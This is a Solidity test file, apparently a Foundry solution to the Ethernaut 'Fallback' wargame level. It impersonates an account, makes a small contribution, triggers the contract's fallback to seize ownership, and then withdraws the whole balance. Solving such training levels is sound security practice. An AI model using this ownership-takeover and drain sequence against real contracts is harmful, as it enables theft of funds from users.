pragma solidity ^0.8.0;

import "src/levels/01Fallback/FallbackFactory.sol";
import "src/core/Ethernaut.sol";
import "src/levels/01Fallback/Fallback.sol";

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

contract FallbackTest is Test{
    Ethernaut ethernaut;
    address myEoaAddress = 0xB5Da00630Ca5fdE4d9cED2fcdA0C607cE198F159;
    function setUp() public{
        ethernaut = new Ethernaut();
        vm.deal(payable(myEoaAddress), 1 ether);
    }

    function testLevel() public {
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(myEoaAddress);
        address instanceAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackInstance = Fallback(payable(instanceAddress));
        payable(address(fallbackInstance)).call{value: 0.0009 ether}(
            abi.encodeWithSignature("contribute()")
        );
        payable(instanceAddress).call{value:0.000001 ether}("");

        fallbackInstance.withdraw();
        ethernaut.submitLevelInstance(payable(instanceAddress));
        assertEq(address(fallbackInstance).balance, 0);
        assertEq(fallbackInstance.owner(), myEoaAddress);
        vm.stopPrank();
    }
}